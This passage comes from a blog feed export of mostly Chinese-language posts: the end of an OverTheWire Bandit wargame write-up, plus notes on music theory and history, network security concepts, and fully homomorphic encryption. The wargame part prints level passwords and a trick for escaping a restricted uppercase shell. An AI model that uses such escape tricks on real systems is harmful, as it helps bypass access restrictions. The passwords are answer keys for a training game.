src="https://tva1.sinaimg.cn/large/008i3skNgy1gz80woisspj30sa0kc77k.jpg" alt="image-20220209224013179"></p><h4 id="Level-29-gt-30"><a href="#Level-29-gt-30" class="headerlink" title="Level 29 &gt; 30"></a>Level 29 &gt; 30</h4><blockquote><p>There is a git repository at <code>ssh://bandit29-git@localhost/home/bandit29-git/repo</code>. The password for the user <code>bandit29-git</code> is the same as for the user <code>bandit29</code>.</p><p>Clone the repository and find the password for the next level.</p></blockquote><p>相同的步骤进行完后，得到如下信息：意思是说从来就没输入过password</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz811hpaitj30qg09qdgt.jpg" alt="image-20220209224448996"></p><p>不管是log还是show都没有内容，这时就应该想到是否存在分支？输入git branch -a显示所有分支，发现一共有四个分支。使用git checkout切换到dev分支，使用git show找到key：5b90576bedb2cc04c86a9e924ce42faf<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81abouguj311q0kytcj.jpg" alt="image-20220209225317103"></p><h3 id="Level-30-gt-31"><a href="#Level-30-gt-31" class="headerlink" title="Level 30 &gt; 31"></a>Level 30 &gt; 31</h3><blockquote><p>There is a git repository at <code>ssh://bandit30-git@localhost/home/bandit30-git/repo</code>. The password for the user <code>bandit30-git</code> is the same as for the user <code>bandit30</code>.</p><p>Clone the repository and find the password for the next level.</p></blockquote><p>同样的工作完成后，这次的提示更搞了:laughing:</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81deiq02j30oo02iaab.jpg" alt="image-20220209225616118"></p><p>试过之前的所有命令后仍然什么都没有发现。只能在git的命令里再找找可能能给出更多信息的。最终找到以下命令：</p><p><code>git show-ref</code>用来查看所有可用引用。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81n9h6ycj313u05w76b.jpg" alt="image-20220209230545716"></p><p>这里看到一个secret，很可能就是答案所在位置，输入git show ref得到key：47e603bb428404d265f59c42920d81e5<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81pfzowwj314203kmxv.jpg" alt="image-20220209230750596"></p><h4 id="Level-31-gt-32"><a href="#Level-31-gt-32" class="headerlink" title="Level 31 &gt; 32"></a>Level 31 &gt; 32</h4><blockquote><p>There is a git repository at <code>ssh://bandit31-git@localhost/home/bandit31-git/repo</code>. The password for the user <code>bandit31-git</code> is the same as for the user <code>bandit31</code>.</p></blockquote><p>这一次我们需要向master push一个文件。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81se89sfj313u098t9p.jpg" alt="image-20220209231040189"></p><p>编辑好这个文件后commit，即可得到key：56a9bf19c63d650ce78e6ec0354ee45e</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz81uyoyhgj313o0bmq4s.jpg" alt="image-20220209231308433"></p><h4 id="Level-32-gt-33"><a href="#Level-32-gt-33" class="headerlink" title="Level 32 &gt; 33"></a>Level 32 &gt; 33</h4><blockquote><p>After all this <code>git</code> stuff its time for another escape. Good luck!</p></blockquote><p>看到题目舒了一口气，终于不用git了哈哈哈。但是登录进来又傻眼了，所有命令都会被变成大写导致无法执行。输入$0执行当前shell(zsh没有)，即可退出UPPERCASE SEHLL，老地方找到key：c9c3199ddf4121b10cf581a98d51caee</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz82g2rj6wj313y06ywez.jpg" alt="image-20220209233325973"></p><h4 id="Level-33-gt-34"><a href="#Level-33-gt-34" class="headerlink" title="Level 33 &gt; 34"></a>Level 33 &gt; 34</h4><blockquote><p><strong>At this moment, level 34 does not exist yet.</strong></p></blockquote><p>完结撒花啦，能够完成真的非常非常地开心，虽然有些题确实不会所以参考了其他人的想法，但是在整个过程中真的学到了很多，不管是命令，脚本都有了从零到一的突破。接下来整理回顾一下就准备开启下一个wargame了，加油，奥利给！</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz82kezszdj313y0ea770.jpg" alt="image-20220209233737315"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security learning</tag>
      
      <tag>Wargame</tag>
      
      <tag>OverTheWire</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>音乐鉴赏笔记</title>
    <link href="/2021/04/27/2021-4-21-Music-Appriciation-Notes/"/>
    <url>/2021/04/27/2021-4-21-Music-Appriciation-Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="一、-乐理"><a href="#一、-乐理" class="headerlink" title="一、 乐理"></a>一、 乐理</h2><ul><li><p>音程：<img src="https://pic3.zhimg.com/80/v2-6d55caab0e8b97d820ba6a71b485dd66_hd.jpg" alt="img"></p></li><li><p>度数：数音名：从C数到G，CDEFG，一共5个音名，所以是5度。</p></li><li><p><img src="https://pic1.zhimg.com/80/v2-49edc6f5f9dbc635f7fbe44e3a44e5ac_hd.jpg" alt="img"></p></li><li><p>快速算法：</p><p>1．所有的一度都是纯一度。</p><p>2．只有3-4、7-1 为小二度 其余为大二度。</p><p>3．中间音为3、4、7、1的为小三度，其余为大三度。（比如 3-5中间音为 4所以是 小三度）</p><p>4．只有4-7为增四度 其余为纯四度。</p><p>5．只有7-4为减五度 其余为纯五度。</p><p>6．<a href="https://baike.baidu.com/item/%E6%A0%B9%E9%9F%B3">根音</a>为3、6、7的为小六度 ，其余为大六度。</p><p>7．根音为1、4的为大七度，其余为小七度。</p><p>8．所有的八度都是纯八度。</p></li></ul><h2 id="二、-中国音乐"><a href="#二、-中国音乐" class="headerlink" title="二、 中国音乐"></a>二、 中国音乐</h2><h4 id="1-古代音乐"><a href="#1-古代音乐" class="headerlink" title="1. 古代音乐"></a>1. 古代音乐</h4><ul><li>河南舞阳贾湖遗址的骨笛：8000年，全世界最古老的吹奏乐器；七孔骨笛（七声音阶）。</li><li>特点：歌、舞、乐相结合。主要形式为歌舞、乐舞。</li><li>音乐起源：巫术、模仿自然、集体劳动。</li><li>古歌：反映狩猎、农牧、祭祀、爱情。</li><li>古乐舞：云门、咸池、萧韶</li></ul><p><strong>西周时期</strong></p><ul><li>礼乐制度：为推行礼治。</li><li>编制：天子64人，8行，诸侯36人，6行，大夫16人，4行，士4人，两行。</li><li>职能：教育，表演，管理。</li><li>八音分类法：金石土革丝木匏竹</li></ul><p><strong>春秋战国时期</strong></p><ol><li>儒家：<ol><li>提倡音乐的教化作用，维护统治阶级</li><li>《乐记》：我国最早具有比较完整体系的音乐理论著作。（本质特征，社会功能、与政治的关系）。</li></ol></li><li>道家：<ol><li>老子：大音希声</li><li>庄子：清静无为；天，地，人籁</li></ol></li><li>墨家：反对音乐，认为会腐化统治者（厚措检平民）</li><li>曾侯乙墓编钟：十二律。</li></ol><h4 id="2-汉唐音乐"><a href="#2-汉唐音乐" class="headerlink" title="2. 汉唐音乐"></a>2. 汉唐音乐</h4><p><strong>乐府</strong></p><ul><li>相和歌：徒歌，但歌，相和大曲：民歌进过乐府整理，加上伴奏。歌舞乐三位一体。</li><li>鼓吹乐：鼓吹：宴饮；横吹：战争。</li><li>bai戏</li></ul><p><strong>乐器</strong></p><ul><li>吹管乐器：排箫、笛、羌笛、笳</li><li>弹拨乐器：箜篌、琵琶、古琴，筑</li></ul><p><strong>魏晋南北朝</strong></p><ul><li>清商三调：相和歌发展而来。</li><li>吴歌：江南一带，一般用箜篌、琵琶等伴奏。</li><li>西曲</li><li>嵇康《声无哀乐论》</li><li>歌舞戏：源自百戏。</li></ul><p><strong>隋唐时期</strong></p><ul><li>隋朝：七部乐，九部乐。</li><li>唐：九部伎，十部伎。坐部伎，立部伎。</li><li>燕（宴）乐：天子宴请宾客。</li><li>大曲：歌舞乐；散序（乐器），中序（歌），破（舞）</li><li>法曲：佛教、道教；《霓裳羽衣曲》</li><li>音乐机构：教坊，梨园</li></ul><h4 id="3-宋元音乐"><a href="#3-宋元音乐" class="headerlink" title="3. 宋元音乐"></a>3. 宋元音乐</h4><p><strong>宋代词调</strong></p><ul><li>形式：令、慢、引、近</li><li>商业集中点：勾栏（民间艺人表演地点），瓦子</li><li>宋杂剧：源于百戏。</li></ul><p><strong>元代</strong></p><ul><li>元杂剧：四折一楔子</li><li>南戏：</li></ul><p><strong>乐器的发展</strong></p><ul><li>笙</li></ul><h4 id="4-明清音乐"><a href="#4-明清音乐" class="headerlink" title="4. 明清音乐"></a>4. 明清音乐</h4><p><strong>戏曲的发展</strong></p><ul><li>四大腔：海盐腔、余姚腔、戈阳腔、昆山腔（流传最广）</li><li>京剧的形成：四大徽班进京</li></ul><p><strong>民间歌舞，说唱</strong></p><ul><li>说唱：鼓词，大鼓，弹词</li><li>民间器乐合奏：十番锣鼓、潮州音乐，福建南音，西安鼓乐</li></ul><h4 id="5-近代音乐"><a href="#5-近代音乐" class="headerlink" title="5. 近代音乐"></a>5. 近代音乐</h4><ul><li>沈心工：《中国》，《黄河》，李叔同，学堂乐歌</li><li>抗日救亡歌咏运动：<ul><li>学院派：刘雪庵，黄自，青主，贺绿汀（游击队之歌，牧童短笛）</li><li>左翼作曲家联盟：思想鲜明，聂耳，冼星海（人民音乐家）</li></ul></li></ul><h4 id="6-中世纪音乐"><a href="#6-中世纪音乐" class="headerlink" title="6. 中世纪音乐"></a>6. 中世纪音乐</h4><ul><li>巴赫：勃兰登堡协奏曲，马太受难曲，平均律钢琴曲集。近代音乐之父</li></ul><h4 id="7-古典主义时期（1750-1830）"><a href="#7-古典主义时期（1750-1830）" class="headerlink" title="7. 古典主义时期（1750-1830）"></a>7. 古典主义时期（1750-1830）</h4><ul><li>原因：启蒙运动：自由，平等，理性</li><li>海顿：维也纳乐派奠基者，出身贫寒，一百多部交响曲（伦敦交响曲，四季</li><li>莫扎特：费加罗的婚礼，唐璜，魔笛，40交响曲晚年</li><li>贝多芬：第三交响曲英雄，第五交响曲命运，第九交响曲合唱（确定交响乐编制，四乐章）田园交响曲（音画）</li><li>交响乐：快板、慢板、小步舞曲或谐谑曲，快板<ul><li>奏鸣曲式：呈示部（第一主题，第二主题，强烈对比）；展开部，再现部，再现呈示部的主题。</li></ul></li></ul><h4 id="8-浪漫主义时期"><a href="#8-浪漫主义时期" class="headerlink" title="8. 浪漫主义时期"></a>8. 浪漫主义时期</h4><ul><li>原因：强调个人情感</li><li>韦伯：邀舞</li><li>舒伯特：野玫瑰</li><li>门德尔松：仲夏夜之梦</li><li>舒曼：蝴蝶，狂欢节</li><li>约翰·施特劳斯：圆舞曲</li><li>肖邦：钢琴诗人</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Notes</tag>
      
      <tag>Music</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络与系统安全笔记</title>
    <link href="/2019/11/07/2019-11-7-Computer-Network-and-System-Security/"/>
    <url>/2019/11/07/2019-11-7-Computer-Network-and-System-Security/</url>
    
    <content type="html"><![CDATA[<h2 id="第一章-计算机系统安全概述"><a href="#第一章-计算机系统安全概述" class="headerlink" title="第一章 计算机系统安全概述"></a>第一章 计算机系统安全概述</h2><p><strong>安全服务</strong> 提供数据处理和数据传输安全性的方法。</p><ol><li>认证</li><li>访问控制</li><li>数据保密</li><li>数据完整性</li><li>非否认。</li></ol><p><strong>安全机制</strong>         保护信息与信息系统安全措施的总称。</p><ol><li>加密。</li><li>数字签名机制。</li><li>访问控制机制。</li><li>数据完整性机制。</li><li>认证交换机制。</li><li>业务填充机制：通过发送额外的数据来掩盖正常通信流量特征，从而达到保护业务流机密性的目的。</li><li>路由控制。</li><li>公正机制：利用可信第三方。</li></ol><p><strong>安全服务与安全机制的关系（重点）</strong>  安全服务由安全机制实现；一种安全机制可以实现一种或多种安全服务；一种安全服务可以由一种或多种安全机制实现。</p><p><strong>网络安全攻击与威胁</strong></p><ol><li><p>被动攻击：在未经用户同意和认可的情况下将信息或数据文件泄露给系统攻击者，但不对数据信息做任何修改。</p><p>•常见手段：搭线监听、无线截获和其它截获 </p></li><li><p>主动攻击。涉及某些数据流的篡改或虚假流的产生。</p><p>•常见手段：重放、篡改消息和拒绝服务 </p></li><li><p>物理访问攻击。</p></li><li><p>内部人员攻击。</p></li><li><p>软硬件配装攻击。</p></li></ol><h2 id="第二章-TCP-x2F-IP协议族及其安全隐患"><a href="#第二章-TCP-x2F-IP协议族及其安全隐患" class="headerlink" title="第二章 TCP&#x2F;IP协议族及其安全隐患"></a>第二章 TCP&#x2F;IP协议族及其安全隐患</h2><h4 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h4><p><strong>协议栈</strong></p><p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574140934940.png" alt="1574140934940"></p><p><strong>网络层的安全威胁</strong></p><ol><li>集线器网络容易被窃听。</li></ol><p><strong>TCP连接</strong></p><ol><li>建立过程：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574141174663.png" alt="1574141174663"></li><li>释放过程：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574141193663.png" alt="1574141193663"></li><li>特点：全双工；面向连接；可靠性（自动分片，自动过滤）；面向字节流。</li><li>安全威胁：<ol><li>SYN Flood：建立半连接，不回复。</li><li>ACK Flood：已建立的连接发送大量ACK，使对方主机不断查表，占用资源。</li><li>序列号预测攻击。</li></ol></li></ol><p><strong>UDP协议</strong></p><ol><li>特点：无连接；不可靠；不保序。</li><li>安全威胁：<ol><li>UDP假冒。</li><li>UDP劫持。</li></ol></li></ol><p><strong>DNS协议</strong></p><ol><li>安全威胁：<ol><li>DNS劫持（缓存毒化）</li><li>DNS ID欺骗</li><li>基于DNS的DDoS攻击。</li></ol></li></ol><p><strong>HTTP协议的安全威胁</strong></p><p>１.　XSS：持久性，非持久性，DOM。</p><h2 id="第三章-网络安全隔离技术"><a href="#第三章-网络安全隔离技术" class="headerlink" title="第三章　网络安全隔离技术"></a>第三章　网络安全隔离技术</h2><h4 id="网络隔离"><a href="#网络隔离" class="headerlink" title="网络隔离"></a>网络隔离</h4><p><strong>同轴电缆</strong>：物理层；</p><p><strong>集线器</strong>：物理层。</p><p><strong>交换机：</strong>链路层。</p><p><strong>虚拟子网VLAN：</strong>在交换机上实现划分。基于端口、MAC、网络层、IP组播。</p><p><strong>路由器：</strong>比交换机、集线器更高层次的安全功能。常用作屏蔽设备。</p><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><blockquote><p>用一个或一组网络设备，在两个或多个网络间加强网络控制，以保护一个网络不受其他网络攻击的安全技术。</p></blockquote><p><strong>分类</strong></p><ol><li>分组过滤防火墙（网络层）：也称包过滤，根据包头信息对网络流量进行处理。</li><li>应用代理防火墙（应用层）：防火墙代理客户端进行连接，但客户端认为是自身连接。</li><li>状态检测防火墙（传输层）：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574142768121.png" alt="1574142768121"></li></ol><p><strong>防火墙的典型体系结构</strong></p><ol><li>包过滤路由器模型：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574142812082.png" alt="1574142812082"></li><li>单宿主堡垒主机模型：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574142840564.png" alt="1574142840564"></li><li>双宿主堡垒主机模型：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574142871404.png" alt="1574142871404"></li><li>子网屏蔽模型：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574142895686.png" alt="1574142895686"></li></ol><p><strong>防火墙的作用</strong></p><ol><li>通过过滤不安全的服务而降低风险，提高内部网络安全性</li><li>保护网络免受基于路由的攻击</li><li>强化网络安全策略</li><li>对网络存取和访问进行监控审计</li><li>利用防火墙对内部网络的划分，实现内部网重点或敏感网段的隔离</li></ol><p><strong>网络地址转换</strong></p><ol><li>概念：将每个局域网节点的地址转换成一个IP地址，反之亦然。</li><li>客户端在同一个NAT之后：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574143793171.png" alt="1574143793171"></li><li>客户端在不同NAT之后：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574143815811.png" alt="1574143815811"></li></ol><h2 id="第四章-网络安全技术"><a href="#第四章-网络安全技术" class="headerlink" title="第四章 网络安全技术"></a>第四章 网络安全技术</h2><h4 id="网络安全模型"><a href="#网络安全模型" class="headerlink" title="网络安全模型"></a>网络安全模型</h4><p><strong>PDR</strong>：Protection, Detection, Response.</p><p><strong>P2DR</strong>: <strong>Police</strong>, protection, detection, response.</p><p>**PDRR: **Protection, detection, response, restoration</p><p><strong>APPDRR</strong>: Assessment, Policy, Protection, detection, reaction, restoration. </p><p><strong>PADIMEE</strong>: Police, Assessment, Design, Implementation, Management&#x2F;Monitor, Emergency Response, Education. </p><p><strong>安全预警技术</strong></p><ol><li>概念：通过监控有敏感数据需要保护的网络，对分布于不同网段的入侵检测传感器所采集的信息数据进行有效、合理的分析，发现潜在的安全威胁和入侵倾向，并预测潜在的攻击目标或攻击发展方向的技术。</li><li>模型：<ol><li>基于入侵事件的预警模型。</li><li>基于攻击过程的预警模型。</li><li>基于流量监控的预警模型。</li></ol></li></ol><p><strong>入侵检测</strong></p><ol><li>概念：对入侵行为(任何企图破坏资源的完整性、保密性和有效性的行为)的发觉。</li><li>分类：<ol><li>根据入侵检测的数据源：基于主机、网络、混合型。</li><li>按照检测方法：异常检测、误用检测。</li><li>按时间：实时、定时（事后）。</li><li>按照系统体系结构：集中式IDS，分布式IDS。</li></ol></li></ol><p><strong>漏洞检测</strong></p><ol><li>安全扫描技术。</li><li>源代码扫描技术。</li><li>反汇编扫描技术。</li><li>环境错误注入技术。</li><li>工具：ISS，Nessus，X-Scan。</li></ol><h2 id="第五章-协议安全技术"><a href="#第五章-协议安全技术" class="headerlink" title="第五章 协议安全技术"></a>第五章 协议安全技术</h2><p><strong>安全协议</strong></p><ol><li>概念：在消息处理过程中采用了若干密码算法的协议。</li><li>分类：秘钥交换、认证、认证和密钥交换、电子商户协议。</li></ol><p><strong>协议攻击方法</strong></p><ol><li>消息重放攻击：由于新鲜性不能保证。例：Needham-Schroeder协议（对策：挑战-应答，时间戳，序列号）<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574146155799.png" alt="1574146155799"></li><li>中间人攻击：<ol><li>例：Diffie-Hellman密钥协商协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574146556962.png" alt="1574146556962"></li><li>例：一次性口令协议S&#x2F;Key：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574147370211.png" alt="1574147370211"></li></ol></li><li>预言机：主题无意地为攻击者执行了一个密码运算。可能被攻击者诱导执行一些步骤，从而帮助攻击者得到某些原来不能得到的信息。<ol><li><img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574147597738.png" alt="1574147597738"></li></ol></li><li>交错攻击：将某个协议的两个或多个实例交错运行。<ol><li>Wiener攻击：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574147978258.png" alt="1574147978258"></li></ol></li><li>平行回话攻击：在攻击者的安排下一个协议的两个或多个运行并发执行。从一个运行中得到另一个运行中困难性问题的答案。<ol><li>例：Woo-Lam单向认证协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574148613867.png" alt="1574148613867"></li></ol></li><li>反射攻击：将消息反射给发送方（不一定原封不动）。欺骗消息发送者提供预言服务。<ol><li>Woo-Lam改进的单向认证协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574148955512.png" alt="1574148955512"></li></ol></li><li>归因于类型缺陷的攻击：由于协议中消息部分的类型信息不明确，使得攻击者将其他信息嵌入秘钥。<ol><li>Neuman-Stubblebine协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574149053112.png" alt="1574149053112"></li><li>Otway-Rees密钥交换协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574149128550.png" alt="1574149128550"></li><li>密码服务滥用攻击：利用之前保存的密码和认证时没有身份信息进行攻击。</li></ol></li></ol><h4 id="认证协议"><a href="#认证协议" class="headerlink" title="认证协议"></a>认证协议</h4><p><strong>身份认证</strong></p><ol><li>定义：声称者向验证者证明自己身份，验证者证实其身份。</li><li>目的：是获得系统服务的第一道关卡。</li><li>分类：本地，远程；单向，双向。</li></ol><p><strong>Kerberos认证协议</strong></p><ul><li><p>MIT开发，身份鉴别服务。集中式的认证服务器结构，功能是实现用户与其访问的服务器间的互相鉴别。采用对称密钥加密。</p></li><li><p>目标：</p><ul><li>安全性：有效防止攻击者假冒合法用户。</li><li>可靠性：分布式服务器体系结构，提供相互备份。</li><li>对用户透明</li><li>可伸缩：能够支持大数量的客户和服务器。</li></ul></li><li><p>设计思路：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574150646687.png" alt="1574150646687"></p></li><li><p>V4协议描述：</p><ol><li>设计思路：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574154100329.png" alt="1574154100329"></li><li>协议交互过程：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574154120011.png" alt="1574154120011"></li></ol></li><li><p>协议的缺陷：</p><ul><li>依赖性：对加密系统（DES）、IP协议、时间的依赖性。</li><li>字节顺序：没有遵循标准。</li><li>票据有效期：最小5分钟，最大21小时，往往不能满足要求。</li><li>认证转发能力：不允许签发给一个用户的鉴别证书转发给其他工作站或用户使用。</li><li>领域之间鉴别困难。</li><li>加密操作缺陷：非标准形式的DES（传播密码分组链接PCBC），易受攻击。</li><li>会话密钥：存在重放攻击可能性。</li><li>口令攻击：未对口令提供额外的保护。</li></ul></li><li><p>V5的改进：</p><ul><li>加密系统：支持任意加密系统。</li><li>通信协议：除了IP外还支持其他协议。</li><li>报文字节顺讯：采用抽象语法表示和基本编码规则。</li><li>票据有效期：允许任意大小。</li><li>鉴别转发能力。</li><li>口令攻击：提供预鉴别机制，使得口令攻击更加困难。</li><li>远程服务访问的认证过程：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574153991927.png" alt="1574153991927"></li></ul></li></ul><h4 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h4><p><strong>SSL</strong></p><ul><li>概念：Secure Sockets Layer Protocol 安全套接层协议。是在应用层与传输层之间的安全协议，为不安全网络提供加密通信。</li><li>目标：<ul><li>加密：使用TCP提供一个可靠的端到端安全服务。为通信实体之间提供保密性，完整性，验证和密钥交换服务。</li><li>可扩展性：新的密钥算法可以容易的加入。</li><li>高效性：减少CPU的使用。</li><li>透明性：对应用层透明。</li></ul></li><li>密码学特征：对称加密数据，公钥加密验证身份，摘要保证完整性。</li></ul><p><strong>SSL的结构</strong></p><ul><li>握手层协议：（SSL HandShake Protocol）、SSL密码参数修改协议（SSL Change Cipher Spec Protocol）、应用数据协议（Application Data Protocol）和SSL告警协议（SSL Alert Protocol）。握手层的这些协议用于SSL管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。SSL握手协议的作用是协调客户和服务器的状态，使双方能够达到状态的同步。</li><li>记录层协议：用来安全传输数据。</li><li>Key Terms<ul><li>SSL会话：是客户和服务器之间的一个关联。通过握手协议创建；定义了一套加密参数；<strong>可以被多个SSL连接共享</strong></li><li>SSL连接：是一种通信实体具有对等关系的通信连接；<strong>与一个SSL回话关联</strong>；连接是瞬时的，用后消失。</li><li>连接与会话的关系：<ul><li>会话用来协商安全参数如算法。</li><li>连接用来安全传输数据。</li><li>通信双方可能有多个安全连接。</li><li>每个连接只和一个回话相关。</li></ul></li><li>SSL会话状态：表示一个具体的SSL会话的信息。</li><li>SSL连接与连接状态：</li></ul></li><li>记录层协议：<ul><li>建立在TCP上。</li><li>使用对称加密提供保密性，HMAC提供完整性。</li><li>步骤：压缩，加密，MAC计算及相反。</li><li>用来封装高层协议：握手层。</li></ul></li></ul><p><strong>SSL工作流程</strong></p><ol><li>发送方：<ol><li>分片</li><li>压缩</li><li>MAC计算</li><li>加密</li><li>封装发送。</li></ol></li><li>握手协议：允许客户端和服务器相互认证、协商加密和MAC算法，保护数据使用的密钥通过SSL记录传递。<strong>在传递应用数据之前使用。</strong><ol><li>功能：客户和服务器相互鉴别，协商密钥交换算法，协商加密算法和密钥，协商压缩算法，生成密钥，完成密钥交换。</li><li>三个协议：Handshake：核心协议；Change Cipher Spec：改变参数时使用；Alert：出现错误时使用。</li><li>Handshake协议：建立或恢复一个会话；每次握手都生成新的密钥等。连接一定是新的，但会话可能是存在的。<ol><li>本质：密钥交换协议。</li><li>过程：<ol><li>建立安全能力</li><li>服务器认证和密钥交换。</li><li>客户端认证和密钥交换。</li><li>完成。</li></ol></li><li>2,3步因为SSL在同一个连接的两个方向采用不同密钥。</li><li>报文总结：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1574158591656.png" alt="1574158591656"></li></ol></li></ol></li></ol><p><strong>TLS</strong></p><ul><li>概念：安全传输层协议用于在两个同心应用程序之间提供保密性和数据完成性。</li><li>组成：TLS握手协议。TLS记录协议。</li></ul><h4 id="公钥证书链"><a href="#公钥证书链" class="headerlink" title="公钥证书链"></a>公钥证书链</h4><ul><li>如三级证书：root-intermediates-end user。</li><li>root：根CA对自己签发。</li><li>intermediates：根CA生成一对公钥、私钥，并用私钥将中间 CA 的信息和公钥进行“加密”生成签名，并封装得到 intermediates 证书。上一级 CA 也是按照这个逻辑给下一级 CA 进行签发证书。</li><li>end-user 证书：最后的 CA 生成公钥私钥，并私钥将用户信息、公钥进行“加密”得到 end-user 证书</li><li>为何需要：根CA需要与数不清的其他安全层次分开，。可以保证中间CA公开的公钥安全。中间CA私钥泄露也不影响根CA。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Notes</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Survey On FHE</title>
    <link href="/2019/11/07/2019-11-7-Survey-on-FHE/"/>
    <url>/2019/11/07/2019-11-7-Survey-on-FHE/</url>
    
    <content type="html"><![CDATA[<h1 id="Survey-On-FHE-Schema-amp-Application"><a href="#Survey-On-FHE-Schema-amp-Application" class="headerlink" title="Survey On FHE (Schema &amp; Application)"></a>Survey On FHE (Schema &amp; Application)</h1><ul><li><p>References</p><blockquote><p>“Fully Homomorphic Encryption over the Integers” –Marten van Dijk et al.</p><p>“Computing Arbitrary Functions of Encrypted Data” –Gentry</p></blockquote></li></ul><h3 id="1-FHE-Schema"><a href="#1-FHE-Schema" class="headerlink" title="1. FHE Schema"></a>1. FHE Schema</h3><ul><li><p><strong>A simple function with homomorphic characteristic:</strong></p><blockquote><p>Modular Operation here: a mod p &#x3D; a -[a&#x2F;p] * p where [x] is the closest integer to x, so that the range of a mod p is now {-p&#x2F;2, p&#x2F;2}.</p></blockquote><p>$c&#x3D;Enc(m)&#x3D;m+pq+2r$</p><p>$m&#x3D;Dec(c)&#x3D;(c\ mod\ p)mod\ 2$</p><p>Plaintext Space: $m\in {0,1}​$ (operates on bits)</p><p>Ciphertext Space : $N$ (cipher can be any integer)</p><p>Key: $P$, can be used as private key where public key be $pq$.</p></li><li><p><strong>Correctness</strong></p><p>$Dec(c_i+c_j)&#x3D;Dec((m_i+m_j))+p(q_i+q_j)+2(r_i+r_j))&#x3D;((m_i+m_j)+2(r_i+r_j))mod(2)&#x3D;m_i+m_j​$</p><p>$Dec(c_i<em>c_j)&#x3D;(m_i+2r_i)(m_2+2r_2)mod(2)&#x3D;m_1</em>m_2​$</p></li></ul><h3 id="2-Noise"><a href="#2-Noise" class="headerlink" title="2. Noise"></a>2. Noise</h3><p>As long as the Public Key is $pq​$, we can subtract it from the ciphertext and get :</p><p>$c-pq&#x3D;m+2r​$</p><p>Because of the interference caused by $2r​$, we could not inference the plaintext. So $m+2r​$ is recognized as “Noise”, and we can know that it augments along with the operation on ciphertext. Note that when $m+2r​$ is bigger than $\frac{p}{2}​$ in absolute value，$c\ mod(p)​$ will not produce prospective result, making it only available on low-polynomial-order functions, so named as SWHE. </p><h3 id="3-Re-encryption"><a href="#3-Re-encryption" class="headerlink" title="3. Re-encryption"></a>3. Re-encryption</h3><ul><li><p>A direct way of noise-cancelling is to decrypt the ciphertext, while it is not quite possible to acquire the private key, so what if we encrypt the key? </p></li><li><p><strong>Premises:</strong> </p><p>​- Evaluate: the algorithm$\epsilon(pk,f,c_i)$ outputs a ciphertext that encrypts $f(c_i)$</p><p>​- Permitted Function:such functions satisfies  Evaluate.</p><p>​- Fresh Ciphertext: Ciphertext encrypted only once. </p></li><li><p><strong>Re-encryption</strong>: if $Dec$ is also a <em>permitted Function</em>, we can calculate: </p><p>$\epsilon (pk_2, Dec, s^*,c^*)$</p><p>where $s^*&#x3D;Enc(pk_2,pk)$ and $c^*&#x3D;Enc(pk2, c)$</p><p>Now we did a decryption on the ciphertext, making it another <em>fresh ciphertext</em>, thus mitigate the overall noise. This approach is called “Homomorphic Re-Decryption”, it works like changing someone’s outfit without taking off any of the original clothes.</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Cryptography</tag>
      
      <tag>Homomorphic Encryption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Review on: Federated machine learning: Concept and applications</title>
    <link href="/2019/10/23/2019-10-23-Review-on-Federated-Machine-Learning/"/>
    <url>/2019/10/23/2019-10-23-Review-on-Federated-Machine-Learning/</url>
    
